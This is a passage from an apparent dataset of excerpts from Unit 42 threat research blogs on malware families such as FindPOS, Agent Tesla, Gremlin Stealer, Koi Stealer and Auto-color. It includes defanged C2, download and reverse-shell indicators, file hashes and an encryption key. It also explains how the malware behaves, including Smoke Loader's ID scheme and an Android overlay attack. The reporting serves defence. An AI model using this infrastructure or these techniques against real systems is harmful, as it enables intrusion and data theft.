\nx2chatgpt[.]org\nChatBot\nchatgpt[.]appleshop[.]top\nChrome Extensions\nchatgptforchrome[.]com \nchrome[.]google[.]com/webstore/detail/ai-chatgpt/boofekcjiojcpcehaldjhjfhcienopme \n94a064bf46e26aafe2accb2bf490916a27eba5ba49e253d1afd1257188b05600", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 has discovered a new Point of Sale (POS) malware family, which includes multiple variants created as early as November 2014. Over the past few weeks we have been analyzing this malware family, which we have dubbed 'FindPOS' due to strings consistently found in each variant.\nWhile this malware doesn't show strong sophistication, the large number of variants shows prevalence similar to families such asAlinaandBackoff. It is clear that FindPOS should be considered a strong threat to Microsoft Windows POS vendors, and measures should be taken to ensure protection.", "source": "Palo"}, {"title": "Conclusion", "content": "Overall, FindPOS isn't terribly sophisticated. It lacks a number of features that we've seen in previous malware families, such as a more sophisticated command and control structure, stronger encryption, and performingluhnchecks on any discovered data. Additionally, the evolution of this family provides interesting clues to the notion that this malware was written from scratch. While FindPOS may share minimal similarities with previously witnessed malware families, we are strongly confident that this malware is a brand new family.\nWhile this malware doesn't show strong sophistication, the large number of variants shows prevalence similar to families such asAlinaandBackoff. It is clear that FindPOS should be considered a strong threat to Microsoft Windows POS vendors, and measures should be taken to ensure protection.\nSuch measures include, but are not limited to, configuring two-factor authentication for any remote access services (LogMeIn, VNC, RDP, etc.), ensuring anti-virus is installed and updated, and ensuring POS devices are not used non-approved functions, such as browsing the web or checking email.\nPalo Alto Networks customers are protected by WildFire, which automatically classifies FindPOS samples as malware. Additionally, the indicators we've discovered that are related to these attacks have been added to PANDB and Anti-Malware protection systems.", "source": "Palo"}, {"title": "Introduction", "content": "This blog describes an attack that Unit 42 observed utilizing malicious compiled HTML help files for the initial delivery. We will show how to analyze the malicious compiled HTML help file. We will then follow the chain of attack through JavaScript and multiple stages of PowerShell and show how to analyze them up to the final payload.\nThe attack is interesting because attackers are often looking for creative ways to deliver their payloads. Their purpose in doing so is twofold:\nAn attempt to bypass security products. \nAn attempt to bypass security training.\nPotential victims may have been trained to avoid documents, scripts and executables from unknown senders, but it is important to be careful of almost any filetype.\nThis particular attack chain delivered Agent Tesla as the final payload. Agent Tesla is well-known malware that has been around for a while. Agent Tesla focuses on stealing sensitive information from a victim's computer and sending that information to the attacker over FTP, SMTP or HTTP. It does this primarily via keystroke logging, screen capturing, camera recording and accessing sensitive data.\nPalo Alto Networks customers are protected from malware families using similar anti-analysis techniques with Cortex XDR or the Next-Generation Firewall with WildFire and Threat Prevention security subscriptions.", "source": "Palo"}, {"title": "Conclusion", "content": "Malicious actors are often looking for creative or different ways to deliver their malicious payloads. Microsoft Compiled HTML files are another file format that can be abused by malicious actors in addition to the more common document or script delivery methods used. It is important to make sure that users are trained to be careful of any attachments, especially from unknown senders.\nPalo Alto Networks customers are protected from malware families using similar anti-analysis techniques withCortex XDRor theNext-Generation FirewallwithWildFireandThreat Preventioncloud-delivered security subscriptions.", "source": "Palo"}, {"title": "Indicators", "content": "3446ec621506d87d372c596e1d384d9fd2c1637b3655d7ccadf5d9f64678681e ORDER OF CONTRACT-pdf.7z081fd54d8d4731bbea9a2588ca53672feef0b835dc9fa9855b020a352819feaa ORDER OF CONTRACT-pdf.chm9ba024231d4aed094757324d8c65c35d605a51cdc1e18ae570f1b059085c2454 N2.jpg0fd2e47d373e07488748ac63d9229fdef4fd83d51cf6da79a10628765956de7a GC.dllc684f1a6ec49214eba61175303bcaacb91dc0eba75abd0bd0e2407f3e65bce2aAgent Tesla dotNet executable\nhxxp://pk-consult[.]hr/N2.jpgftp.videoalliance[.]ru", "source": "Palo"}, {"title": "Introduction", "content": "As shown in Figure 1, Rootnik distributes itself by repackaging and injecting malicious code into legitimate Android apps. After it is installed on an Android device, Rootnik launches a new thread to gain root privileges if certain conditions are met. Meanwhile, it begins an \"app promotion\" procedure that displays advertisements for other apps to the user. To gain root access, Rootnik first downloads encrypted payloads from a remote server if they do not exist locally then proceeds to attempt exploitation of one of four vulnerabilities. After achieving root access successfully, the malware writes four APK files to the system partition and reboots the compromised device.\nFigure 1: An overview of Rootnik's workflow\nThese four APK files serve as system apps after rebooting, and primarily fall into three categories based on their functionality. Based on the samples we have collected so far the file names of these four APKs are static.\nAndroidSettings.apk \nBluetoothProviders.apk \nWifiProviders.apk \nVirusSecurityHunter.apk\nAndroidSettings.apk is responsible for promoting Android apps and has similar logic to the host malware's app promotion procedure. BluetoothProviders.apk and WifiProviders.apk actually perform identical tasks, they act as a remote control component that can install and uninstall apps as well as download and execute new code from remote servers.\nVirusSecurityHunter.apk is totally a private data-harvesting component, which can steal WiFi information, a victim's location and other potentially sensitive data.", "source": "Palo"}, {"title": "Introduction", "content": "The high-level actor motivations covered earlier in this blog series introduced challenges in identifying and attributing activity between Cyber Espionage, Cyber Crime, and Cyber Hacktivism.\nAnalysis of the remaining motivations covered in this blog post can be even fuzzier considering the following:\nPolitical debate on definitions: Especially when it comes to international activity that directly results in loss of life, physical destruction of facilities, or negative economic hits, arguments persist over how these should be treated by nation state governments, military, and law enforcement agencies. The most serious debate concerns whether computer network related incidents constitute acts of war between countries. \nHand-off between motivations: A number of motivations benefit from leveraging Tactics, Techniques, and Procedures (TTPs) and associated tools of another motivation either before or after focal activity. For example, Cyber Espionage can benefit Cyber Warfare operations, and Cyber Hacktivism can extend into Cyber Terrorism.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 discovered a new family of Android malware that successfully evaded all antivirus products on the VirusTotal web service. We named this malware family \"Gunpoder\" based on the main malicious component name, and the Unit 42 team observed 49 unique samples across three different variants. This finding highlights the fine line between \"adware,\" which isn't traditionally prevented by antivirus products, and malware, with its ability to cause harm.\nSamples of Gunpoder have been uploaded to VirusTotal since November 2014, with all antivirus engines reporting either \"benign\" or \"adware\" verdicts, meaning legacy controls would not prevent installation of this malware. While researching the sample, we observed that while it contained many characteristics of adware, and indeed embeds a popular adware library within it, a number of overtly malicious activities were also discovered, which we believe characterizes this family as being malware, such as:\nCollecting sensitive information from users \nPropagating itself via SMS message \nPotentially pushing fraudulent advertisements \nAbility to execute additional payloads\nGunpoder targets Android users in at least 13 different countries, including Iraq, Thailand, India, Indonesia, South Africa, Russia, France, Mexico, Brazil, Saudi Arabia, Italy, the United States, and Spain. One interesting observation from the reverse engineering of Gunpoder is that this new Android family only propagates among users outside of China.\nUnit 42 investigated Gunpoder using the Palo Alto NetworksAutoFocusservice, and released protections for users of WildFire, Threat Prevention and Mobile Security Manager for all currently known Gunpoder variants. Thanks to Palo Alto Networks unique prevention capabilities across the attack lifecycle, future members of the Gunpoder malware family could also potentially be blocked.", "source": "Palo"}, {"title": "Conclusion", "content": "Overall, the Gunpoder malware family contains a number of activities associated with adware. However, as we've previously discussed, a number of malicious functionalities exist as well. Examples of this include the ability to collect very sensitive information from victims, propagation via SMS messages, and the ability to execute other payloads.\nThe inclusion of a legitimate advertisement library causes many antivirus programs to simply label Gunpoder samples as adware, which is often not blocked by default. This allows some of the more malicious activity present in Gunpoder to continue unnoticed.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers have identified information-stealing malware written in C#, called Gremlin Stealer. This malware appears to be a variant of Sharp Stealer, displaying a code base strikingly similar to Hannibal Stealer. This stealer's seller has actively advertised it on a Telegram group since mid-March 2025.\nThis information-stealing malware exfiltrates data from its victims and uploads this information to its web server for publication. It can capture data from browsers, the clipboard and the local disk to steal sensitive data such as credit card details, browser cookies, crypto wallet information, File Transfer Protocol (FTP) and virtual private network (VPN) credentials.\nPalo Alto Networks customers are better protected from Gremlin Stealer through ourNetwork Securitysolutions andCortexline of products, includingCortex XDRandXSIAM,Advanced WildFire,Advanced Threat Prevention,Advanced URL FilteringandAdvanced DNS Security.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "Gremlin Stealer is new malware that has been active since March 2025. This malware searches for a variety of applications on a victim's Windows computer, and our code analysis confirms the specific applications targeted.\nStealers of this type are well-known entities in the threat landscape, and there are many approaches to protecting customers from these evolving attacks. Palo Alto Networks diligently monitors these campaigns, utilizing a range of static and dynamic techniques to detect and prevent them.\nThese methods include dynamic and behavioral detections, as well as more reactivesignature or pattern-based solutions.", "source": "Palo"}, {"title": "Indicators", "content": "SHA256 hash of the Gremlin Stealer sample analyzed for this article:\nd1ea7576611623c6a4ad1990ffed562e8981a3aa209717065eddc5be37a76132\nURLs:\nhxxp[:]//207.244.199[.]46/index.php\nUpdated May 9, 2025, at 10:05 a.m. PT to note Gremlin Stealer's similarities to other stealers.", "source": "Palo"}, {"title": "Introduction", "content": "This is the second part of a two-part blog post for understanding Angler exploit kit (EK). Thefirst partcovered EKs in general. This blog focuses on the Angler EK.\nAngler is currently one of the most advanced, effective, and popular exploit kits in the cyber criminal market. It generally uses the most recent exploits based on the latest vulnerabilities. Like most leading EKs, the authors behind Angler use Software as a Service (SaaS) as their business model, and Angler can be rented in the cyber underground fora few thousand dollars a month.", "source": "Palo"}, {"title": "Conclusion", "content": "Angler EK will no doubt continue to evolve. We expect the EK to continue implementing improvements to avoid detection. As a payload of Angler EK, Bedep malwarehas recently changedand is much more capable of detecting virtual environments used by security researchers. CryptXXX ransomware isa growing menacethat also has information stealing capabilities, and it appears to be moving to other campaigns that formerly spread TeslaCrypt ransomware.\nHow can people protect themselves against Angler EK? As stated inpart 1 of this blog post, use a layered defense. First, make sure your operating system and applications are patched and up-to-date. Like any other EK, Angler takes advantage of outdated browser-based applications to infect vulnerable Windows hosts.\nNetwork monitoring and endpoint protection are additional components of a layered defense. Palo Alto Networks Next-Generation Security Platform can help security teams monitor their network to detect the constantly changing indicators of Angler EK. Endpoint solutions like Palo Alto NetworksTrapscan help protect an organization's assets against malicious executables, data files or network-based exploits before any malicious activity can successfully run.\nDomains, IP addresses, and other indicators associated with Angler EK and its associated payloads are constantly changing. We continue to investigate this activity for applicable indicators to inform the community and further enhance our threat prevention platform.", "source": "Palo"}, {"title": "Introduction", "content": "Over the past few months, we have detected sophisticated script-based malware through Internet Explorer (IE) browser exploits that infect Windows Operating System (OS) users. We decided to investigate those scripts to identify their key features to demonstrate that they are attractive for attackers and so could lead to a trend worth paying attention to.\nIndeed, with scripting languages, attackers have flexible and accessible tools to easily create sophisticated malware with multiple features and obfuscations. To demonstrate this, we chose two examples of script-based malware used to infect Windows OS users. Those examples were found from two separate sources, but came from the same IE browser exploit of the CVE-2019-0752 vulnerability. The first is a JScript Remote Access Trojan (RAT) that ensures persistence on the target system and then uses encoded network connection to connect to the attacker. After that, the attacker can execute arbitrary commands on the target machine to have potentially full control of it. The second is an AutoIT downloader that uses network connection and script functions to download and execute malware, which could be used to infect targeted systems with malware such as ransomware, spyware and so on.\nFinally, to give more details about scripting languages used for script-based malware, we explore possible explanations for the attackers' choice to use scripts instead of regular executables as the payload in the browser exploit.\nOrganizations with up-to-date Windows hosts that followsecurity best practices for secure web browsinghave a much lower risk of infection. Palo Alto Networks customers are protected from this threat via IPS signatures. URL Filtering and WildFire both identify related samples and infrastructure as malware.", "source": "Palo"}, {"title": "Conclusion", "content": "The samples presented are two examples of how attackers can use scripts to engage in malicious activities on Windows target machines. Those scripts do not reinvent the wheel, but they do offer flexibility and accessibility to attackers. As we saw in our analyses, these advantages allow the attackers to execute commands and so potentially have full control over target machines. For these reasons, attackers may have an incentive to choose this option.\nOrganizations with up-to-date Windows hosts that followsecurity best practices for secure web browsinghave a much lower risk of infection. Palo Alto Networks customers are further protected from this threat. Indeed, customers are currently covered for the CVE-2019-0752 vulnerability by our IPS signature 55438. URL Filtering and WildFire also protect our customers from the kinds of attacks described here.", "source": "Palo"}, {"title": "Introduction", "content": "CTB-Locker is a well-known ransomware Trojan used by crimeware groups to encrypt files on the victim's endpoints and demand ransom payment to decrypt the files back to their original state, but most antiviruses detect it by mistake as CryptoLocker (only one vendor correctly detects it as CTB-Locker). The attack vector is very basic and repeats itself: It begins with a spear phishing email sent with SCR attachments (double zipped). Once executed by the user the first stage malware downloads and executes the ransomware from a fixed hardcoded server list.", "source": "Palo"}, {"title": "IOC", "content": "breteau-photographe.com (213.186.33.150) \nvoigt-its.de (188.93.8.7) \nmaisondessources.com (213.186.33.19) \njbmsystem.fr (213.186.33.3) \npleiade.asso.fr (213.186.33.19) \nscolapedia.org (213.186.33.19)\nWe can see here that server hostnames were changed but they didn't change the server IP address \u2013 see the attached file with results for files from last week's campaign fromVirusTotal. Most legacy security programs could not detect this malware at the time it was posted. If you re-test these hashes again from last week you can see an average of 49/57 engines that detect last week's threat \u2013 but that's too little, too late for anyone who already lost data.", "source": "Palo"}, {"title": "IOC", "content": "The most surprising fact about this campaign is that almost all the IOCs haven't been changed:\nSame mutex name: wuqntwklyxwhac \nSame job name: cderkbm.job . \nNew IOC: additional mutex name - 87281673\nFor those still using legacy solutions we've attached two lists of SHA256 hashes in a text file format for reference.One list shows the new campaign, which continues to progress.The other list is of last week's campaignby the same attackers (exhaustive or close to it).", "source": "Palo"}, {"title": "Conclusion", "content": "Palo Alto Networks Enterprise Security Platform would have stopped this ransomware attack campaign thanks to the platform's unique integration between the network, endpoint and the cloud to maximize security. Attacks aren't getting any less sophisticated, so it is time to leave legacy security solutions behind and upgrade to real, prevention-based security.", "source": "Palo"}, {"title": "Introduction", "content": "Initially, the threat generates a unique ID for the compromised machine from the computer name, the hardcoded static number(0B0D0406), and the volume serial number of the system drive. Smoke Loader uses the unique ID for three purposes:\nTracking the compromised machine at C2. \nEncrypting payload by the ID. \nCreating random file names for persistence.\nHere's how to create the unique ID. If the computer name is \"Test_PC\" and the volume serial number is \"12345678\", the threat appends the three values like the following:\n\"Test_PC\" + \"0B0D0406\" + \"12345678\" = \"Test_PC0B0D040612345678\"\nand it calculates the MD5 hash value of the string,\nMD5(\"Test_PC0B0D040612345678\") = 41EE612602833345FC5BD2B98103811C\nIt then appends the volume serial to the hash value and gets the 40 characters unique ID.\n\"41EE612602833345FC5BD2B98103811C\" + \"12345678\" = \"41EE612602833345FC5BD2B98103811C12345678\"\nNext, Smoke Loader generates two strings based on the first eight characters and the last eight characters of the ID. Following is the algorithm written in Python.\nSmoke Loader uses these strings for the file name. It copies itself as follows.\n%APPDATA%\\Microsoft\\Windows\\[stringA\\[stringB].exe\nand it creates following shortcut file to execute the threat when the computer starts.\n%StartUp%\\[stringA].lnk\nThese two strings look random. However, the attacker always generates two identical strings to the compromised machine since it is based on the static values of the environment.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers have been observing various malicious campaigns abusing either legitimate challenge and response services (such as Google's reCAPTCHA) or deploying customized fake CAPTCHA-like validation. Recent security blogs onphishing campaigns andcybercriminals using reCAPTCHAand research papers likePhishTimeandCrawlPhishshow an increasing trend of CAPTCHA-protected phishing pages. Hiding phishing content behind CAPTCHAs prevents security crawlers from detecting malicious content and adds a legitimate look to phishing login pages.\nIn this blog, we show techniques to detect malicious content with security crawlers even in the presence of CAPTCHA evasion. In some cases, these techniques can even track and detect such campaigns. We see many malicious campaigns reuse CAPTCHA service keys, either to simplify their malware infrastructure or to avoid being blocked by the legitimate reCAPTCHA provider for creating too many CAPTCHA accounts and keys.\nOur research paper \"Betrayed by your Dashboard\" (published in 2018 at TheWebConf) shows that web analytics IDs can be used to identify large-scale malicious campaigns, as attackers often use legitimate web analytics services. Here, we show how similar pipelines can be used to detect phishing pages through the association of CAPTCHA keys.\nLooking at the top 10 most popular malicious CAPTCHA keys across broad phishing campaigns just over the last month, we blocked 7,572 unique URLs over 4,088 pay-level domains, protecting our customers from visiting them at least 202,872 times. At the same time, we see that such URLs are slower in appearing in third-party malicious feeds, presumably because of hidden phishing, scam and other malicious content.\nPalo Alto Networks Next-Generation Firewall customers withAdvanced URL Filtering andWildFire security subscriptionsare protected against such sophisticated phishing campaigns.", "source": "Palo"}, {"title": "Conclusion", "content": "Mass phishing and grayware campaigns have become more sophisticated, using evasion techniques to escape detection by automated security crawlers. Fortunately, when malicious actors use infrastructure, services or tools across their ecosystem of malicious websites, we have a chance to leverage these indicators against them. CAPTCHA identifiers are one great example of such detection by association.\nPalo Alto Networks continually monitors CAPTCHA IDs as one example of a malicious indicator, and we use it to detect phishing, malware and grayware pages. Palo Alto Networks Next-Generation Firewall customers withAdvanced URL Filtering andWildFire security subscriptionsare protected against such sophisticated phishing campaigns.\nBelow is the list of top 10 popular Captcha ID signatures for the period April 18-May 18.6LcEthAUAAAAANLeILVZiZpPDbVwyoQuQ7c3qlsy6LcJK64UAAAAAKwjDYyWpakQ_5aFAb34tK-EkiDA6Le-dsYUAAAAABJa32oIuo9LEPsur7OcBz-a9kyL6LfKnxEUAAAAAO1iXBX9FqL0w-68XqXGl3UPBF5p6Lc8-cQUAAAAAF60sMK0PjhPOA6ciyzy6cfnGcl06LeihuEUAAAAAEgMRhYQKQCxnJvsqIZnRghJAPcH6LezpHMUAAAAALunasQAvKdhRwFC1oqRE0OZW8f46LdkVo0aAAAAAN5yxjGbJPH39rF--s6ZVsl_LxzE6LdVFrgUAAAAAEMNq1ljl8HZSQ2sA8Hu6a8umPQr6LfrPbMUAAAAAF2DLXNWH8-s0Ln08lXtaX9k1tRC\nThe list of all IOCs can be found onGitHub.\nWe'd like to thank Unit 42 for helping us with this blog. Special thanks to Bahman Rostamyazdi, David Fuertes, Taojie Wang, Tao Yan and Hector Debuc for helping us with the data.", "source": "Palo"}, {"title": "Introduction", "content": "Malware targeting macOS systems is increasingly pervasive in our current threat landscape. Most of the associated threats are cybercrime-related, ranging from information stealers to cryptocurrency mining. Over the past year, we have witnessed an increase in cybercrime activity linked to North Korean nation-state APT groups.\nIn line with thepublic service announcementissued by the FBI regarding North Korean social engineering attacks, we have also witnessed several such social engineering attempts, targeting job-seeking software developers in the cryptocurrency sector.\nIn this campaign, we discovered a Rust-based macOS malware nicknamedRustDoormasquerading as a legitimate software update, as well as a previously undocumented macOS variant of a malware family known asKoi Stealer. During our investigation, we observed rare evasion techniques, namely, manipulating components of macOS to remain under the radar.\nThe characteristics of these attackers are similar to various reports during the past year ofNorth Korean threat actors targeting other job seekers. We assess with a moderate level of confidence that this attack was carried out on behalf of the North Korean regime.\nThis article details the activity of attackers within compromised environments. It also provides a technical analysis of the newly discovered Koi Stealer macOS variant and depicts the different stages of the attack through the lens of Cortex XDR.\nPalo Alto Networks customers are better protected against the RustDoor and Koi Stealer malware presented in this research through the following products and services:\nCortex XDRandXSIAM \nCloud-Delivered Security Servicesfor theNext-Generation Firewall, such asAdvanced WildFire,Advanced DNS SecurityandAdvanced URL Filtering.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "In this article, we reviewed a campaign we believe is linked to North Korean threat actors. The campaign includes a previously undocumented macOS variant of malware known as Koi Stealer. We analyzed how attackers delivered and used it to try to gather sensitive data and cryptocurrency wallets from compromised endpoints. We reviewed the modus operandi of this campaign and discussed the possible ties this campaign has with North Korean threat actors.\nWe also detailed the persistent nature of the attackers that deployed different tools, as their previous attempts were detected and prevented by Cortex XDR.\nFinally, this campaign highlights the risks organizations worldwide face from elaborate social engineering attacks designed to infiltrate networks and steal sensitive data and cryptocurrencies. These risks are magnified when the perpetrator is a nation-state threat actor, compared to a purely financially motivated cybercriminal.\nWe encourage organizations to implement a proactive and multilayered approach when facing such threats and invest in social engineering awareness training.", "source": "Palo"}, {"title": "Indicators", "content": ".zsh_env\nFAT:a900ec81363358ef26bcdf7827f6091af44c3f1001bc8f52b766c9569b56faa5\nx64:baa676b671e771bf04b245e648f49516b338e1f49cbd9b4d237cc36d57ab858d\narm:76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9\nFAT:adde2970b40634e91b9ef8520f8e50eaa7901a65f9230e65d7995ac1a47700ef\nx64:c379f4ab29a49d4bccb232c8551d1b8b01e64440ea495bbabef9010a519516c3\narm:a5b7ddd12539ce3e8c08bed5855ddcea3217d41d7d4c58fcc1a7e01336b38912\nFAT:b5412375477a180608bf410f5cb36b4a0949bee7663648a06879f42be9a3b6bc\nx64:b5119a49830a2044f406645c261e54ab335c9b1e1ed320df758405a8147fae88\nARM:17064520feaf5804aa725e123b24fd0f73f8afc9b7f4361650cd11ddf4ee768f\nFAT:8be62324fe5af009c12fb9afc8d4f47d12c98ea680bff490b3f5e0c72c8f9617\nx64:77361f7ef25a0185636a0fc6deff2e9986720223da9d6b1494f671082105bebb\nARM:27fcc3278afbbec44737e9f72666946607fea819f5b1cb9fbbe268037a561f0b\nFAT:97abafff549ea21797c135c965c5e4a46a44ec7353b2edd293e8a22d5954b6aa\nx64:c42b103b42d7e9817f93cb66716b7bf2e4fe73a405e0fbbae0806ce8b248a304\nARM:8f0e2b8b3e07f5761066cb00bc0db10d68c56ada8c054e9f07990cc1ac5ae962\nMalware downloads domain\nhxxps://apple-ads-metric[.]com\nRustDoor C2 domain\nhxxps://visualstudiomacupdate[.]com\nmacOS Koi Stealer C2 IP address\n5.255.101[.]148\nReverse shell IP address\n31.41.244[.]92\nStrings encryption key\nxRdEh3f6g1qxTxsCfg1d30W66JuUgQvVti", "source": "Palo"}, {"title": "Introduction", "content": "On March 4, 2019, one of the most well-known keyloggers used by criminals, calledAgent Tesla, closed up shop due to legal troubles. In the announcement message posted on the Agent Tesla Discord server, the keylogger's developers suggested people switch over to a new keylogger: \"If you want to see a powerful software like Agent Tesla, we would like to suggest you OriginLogger. OriginLogger is an AT-based software and has all the features.\" OriginLogger is a variant of Agent Tesla. As such, the majority of tools and detections for Agent Tesla will still trigger on OriginLogger samples.\nRecently, when sitting down to analyze some malware tagged as Agent Tesla, I was surprised to learn I was actually looking at something else. This fact revealed itself to me when I began analyzing the malware families' configurations at scale after creating tooling to extract them.\nIn this blog, I will cover the OriginLogger keylogger malware, how it handles the string obfuscation for configuration variables and what I found when looking at the extracted configurations that allowed for better identification and further pivoting.\nPalo Alto Networks customers receive protections from both OriginLogger and its predecessor malware Agent Tesla throughCortex XDRand theNext-Generation Firewallwithcloud-delivered security servicesincludingWildFireandAdvanced Threat Prevention.", "source": "Palo"}, {"title": "Conclusion", "content": "OriginLogger, much like its parent Agent Tesla, is a commoditized keylogger that shares many overlapping similarities and code, but it's important to distinguish between the two for tracking and understanding. Commercial keyloggers have historically catered to less advanced attackers, but as illustrated in the initial lure document analyzed here, this does not make attackers any less capable of using multiple tools and services to obfuscate and make analysis more complicated. Commercial keyloggers should be treated with equal amounts of caution as would be used with any malware.\nLuckily, in this instance, because of the similarities between the two aforementioned keyloggers, detections and protections carried over from one generation to the next \u2013 albeit with slightly inaccurate signature naming.\nPalo Alto Networks customers receive protections from both OriginLogger and its predecessor malware Agent Tesla throughCortex XDRand theNext-Generation Firewallwithcloud-delivered security servicesincludingWildFireandAdvanced Threat Prevention.", "source": "Palo"}, {"title": "Introduction", "content": "Today,INTERPOLand The Nigeria Police Force announced the results of Operation Falcon II, joint operations that led to the arrest of 11 Nigerian business email compromise (BEC) actors. Collaborative in its approach, this operation leveraged intelligence and resources from several industry partners combined with law enforcement entities from over six nations in order to map global victims back to a core subset of actors who have historically operated outside of foreign law enforcement jurisdictions.\nBEC remains the most common and most costly threat facing our customers. This threat held the top spot for the fifth year in a row on the 2020 FBI Internet Crime Complaint Center (IC3)report. Over half a decade, global losses have ballooned from $360 million in 2016 to a staggering $1.8 billion in 2020. As we eagerly await the release of the 2021 numbers, our telemetry and experience helping clients respond to BEC attacks suggests that last year's global losses will once again set new records.\nDespite these massive loss amounts, industry and global law enforcement continue to make considerable strides toward thwarting this activity.\nFurthermore, this recent operation was novel in its approach in that it didn't target the easily identifiable money mules or flashy Instagram influencers who are typically seen benefiting from these schemes. Instead, it focused predominantly on the technical backbone of BEC operations by targeting the actors who possess the skills and knowledge to build and deploy the malware and domain infrastructure used in these schemes. Of the individuals arrested, we track six out of the 11 actors as beingSilverTerrier(Nigerian malware) actors who have successfully avoided prosecution for the past half decade due to the complexities of mapping global victims beyond the flow of stolen funds back to the source of malicious network activity.\nThis blog provides a brief overview of the six actors and provides recommendations to help organizations protect against these threats.\nPalo Alto Networks customers are protected against the types of BEC threats discussed in this blog by products includingCortex XDRand theWildFire,Threat Prevention,AutoFocusandAdvanced URL Filteringsubscription services for theNext-Generation Firewall.", "source": "Palo"}, {"title": "Conclusion", "content": "While BEC schemes remain the most profitable and widespread form of cybercrime on the internet, private/public collaborative efforts continue to make tremendous strides in combating these threats on a global scale. The most recent joint operations championed by The Nigeria Police Force and INTERPOL serve as an inspiring example. These operations drew on insights and collaboration from multiple industry partners and law enforcement entities from more than six nations in order to achieve positive outcomes. Those outcomes include disruption of BEC networks within Nigeria, improved international coordination and most importantly, the arrest of 11 actors, who for the better half of a decade have avoided prosecution while providing the technical expertise, malware and malicious domains used in countless BEC campaigns.\nPalo Alto Networks was the first cybersecurity company to sign a partnership agreement with INTERPOL in 2017. This agreement served as the foundation for our collaborative efforts in combating criminal trends in cyberspace and other cyberthreats globally. Since then the partnership has continued to evolve, and today Palo Alto Networks remains a proud contributing member of INTERPOL's Gateway program.", "source": "Palo"}, {"title": "Introduction", "content": "Palo Alto Networks Unit 42 researchers have uncovered a high severity vulnerability in the Android overlay system, which allows a new Android overlay attack by using the \"Toast type\" overlay. All Android devices with OS version < 8.0 are affected by this vulnerability and patches are available as part of theSeptember 2017 Android Security Bulletin. Android 8.0 was just released and is unaffected by this vulnerability. Because Android 8.0 is recent, this vulnerability affects nearly all Android devices currently in the market (see Table 1) and users should apply updates as soon as possible.\nOverlay attacks permit an attacker to draw on top of other windows and apps running on the affected device. To launch such an attack, malware normally needs to request the \"draw on top\" permission. However, this newly discovered overlay attack does not require any specific permissions or conditions to be effective. Malware launching this attack does not need to possess the overlay permission or to be installed from Google Play. With this new overlay attack, malware can entice users to enable the Android Accessibility Service and grant the Device Administrator privilege or perform other dangerous actions. If these privileges are granted, a number of powerful attacks can be launched on the device, including stealing credentials, installing apps silently, and locking the device for the ransom.\nThe research was inspired by the paper \"Cloak and Dagger: From Two Permissions to Complete Control of the UI Feedback Loop\" by Yanick Fratantonio of UC Santa Barbara and Chenxiong Qian, Simon P. Chung, Wenke Lee of Georgia Tech (PDF Link). This paper was recently presented at the IEEE Security & Privacy 2017 conference in May 2017. This paper proposed several innovative accessibility attacks but with the assumption that the malicious app must explicitly request two permissions and be installed from Google Play. Our new research shows that the accessibility attacks proposed in the paper can be launched successfully even if the app is not from Google Play and declares only one permission \"BIND_ACCESSIBILITY_SERVICE\".\nAs withCloak and Dagger, this overlay attack works by modifying regions of the screen to change what the user sees, tricking them into enabling additional permissions or identifying their inputs. A video of the this attack in action is available here:\nThis vulnerability was assignedCVE-2017-0752and was disclosed in theAndroid Security Bulletin September.", "source": "Palo"}, {"title": "Introduction", "content": "Between early November and December 2024, Palo Alto Networks researchers discovered new Linux malware called Auto-color. We chose this name based on the file name the initial payload renames itself after installation.\nThe malware employs several methods to avoid detection, such as:\nUsing benign-looking file names for operating \nHiding remote command and control (C2) connections using an advanced technique similar to the one used by the Symbiote malware family \nDeploying proprietary encryption algorithms to hide communication and configuration information\nOnce installed, Auto-color allows threat actors full remote access to compromised machines, making it very difficult to remove without specialized software.\nThis article will cover aspects of this new Linux malware, including installation, obfuscation and evasion features. We will also discuss its capabilities and indicators of compromise (IoCs), to help others identify this threat on their systems too.\nPalo Alto Networks customers are better protected from the threats discussed in this article through the following products or services:Advanced WildFiremachine-learning models, as well asAdvanced URL FilteringandAdvanced DNS Security, andCortex XDRandXSIAM.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "Auto-color is an emerging threat that Palo Alto Networks researchers discovered that does several things to avoid detection. The evasive actions range from trivial things such as renaming the malware to a benign-looking name like Auto-color, to more sophisticated methods such as hiding system network connections and preventing uninstallation through hookinglibcfunctionality.\nUpon execution, the malware attempts to receive remote instructions from a command server that can create reverse shell backdoors on the victim's system. The threat actors separately compile and encrypt each command server IP using a proprietary algorithm. IoCs are listed at the end to help readers identify whether their systems have been compromised by Auto-color.\nPalo Alto Networks customers are better protected from the threats discussed in this article through the following products or services:\nTheAdvanced WildFiremachine-learning models and analysis techniques have been reviewed and updated in light of the IoCs shared in this research. \nCortex XDRandXSIAMblock and alert on known behaviors and indicators associated with Auto-color. \nAdvanced URL FilteringandAdvanced DNS Securityidentify known URLs and domains associated with this activity as malicious.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950 \nIndia: 00080005045107\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "Malicious files from Auto-Color:\nSHA256 hash:270fc72074c697ba5921f7b61a6128b968ca6ccbf8906645e796cfc3072d4c43\nFile size: 229,160 bytes \nFile name:log \nFile type: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked \nFile description: Sample 1 malware from Auto-color\nSHA256 hash:65a84f6a9b4ccddcdae812ab8783938e3f4c12cfba670131b1a80395710c6fb4\nFile size: 229,160 bytes \nFile name:edus \nFile type: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked \nFile description: Sample 2 malware from Auto-color\nSHA256 hash:83d50fcf97b0c1ec3de25b11684ca8db6f159c212f7ff50c92083ec5fbd3a633\nFile size: 